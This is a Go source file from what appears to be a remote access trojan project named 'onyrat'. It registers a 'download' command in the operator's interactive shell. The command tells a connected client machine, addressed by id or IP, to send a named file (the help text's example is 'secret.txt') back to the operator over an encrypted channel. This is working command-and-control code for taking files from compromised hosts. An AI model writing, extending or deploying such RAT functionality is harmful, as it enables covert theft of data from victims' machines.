//go:build server
// +build server

package handlers

import (
	"context"
	"fmt"
	"os"
	"time"

	"github.com/Onyz107/onyrat/pkg/commands/transfer"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/abiosoft/ishell"
)

func RegisterDownloadCommand(s *network.KCPServer, shell *ishell.Shell, ctx context.Context) {
	shell.AddCmd(&ishell.Cmd{
		Name: "download",
		Help: "download a file from a client",
		LongHelp: `
Usage: download <id|address> <fileName> <targetPath>

Downloads the specified file from a client to your machine.

Examples:
  download 1 secret.txt downloaded.txt
  download 192.168.70.26 report.pdf report.pdf`,

		Func: func(c *ishell.Context) {
			if len(c.Args) < 3 {
				c.Println("Type `download help` for more information")
				c.HelpText()
				c.Err(fmt.Errorf("not enough arguments"))
				return
			}

			address := c.Args[0]
			if address == "" {
				c.Println("Usage: download <id|address> <fileName> <targetPath>")
				c.Err(fmt.Errorf("invalid address/id"))
				return
			}

			filename := c.Args[1]
			if filename == "" {
				c.Println("Usage: download <id|adderss> <fileName> <targetPath>")
				c.Err(fmt.Errorf("invalid filename"))
				return
			}

			targetPath := c.Args[2]
			if targetPath == "" {
				c.Println("Usage: download <id|adderss> <fileName> <targetPath>")
				c.Err(fmt.Errorf("invalid target path"))
				return
			}

			client, err := getClient(s, address)
			if err != nil {
				c.Println("Failed to get client")
				c.Err(err)
				return
			}

			address = client.Sess.RemoteAddr().String()

			stream, err := getStream(client)
			if err != nil {
				c.Println("Failed to get stream")
				c.Err(err)
				return
			}

			if _, err := os.Stat(targetPath); err == nil {
				c.Printf("%s already exists\n", targetPath)
				c.Err(fmt.Errorf("target path already exists"))
				return
			}

			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
				c.Println("Failed to send command to client")
				c.Err(err)
				return
			}

			if err := s.SendEncrypted(stream, []byte(filename), 10*time.Second); err != nil {
				c.Println("Failed to send filename to client")
				c.Err(err)
				return
			}

			go func() {
				if err := transfer.Download(s, client.Manager, targetPath, ctx); err != nil {
					c.Printf("Failed to download file: %s: %v\n", filename, err)
					return
				}
			}()
		},
	})
}
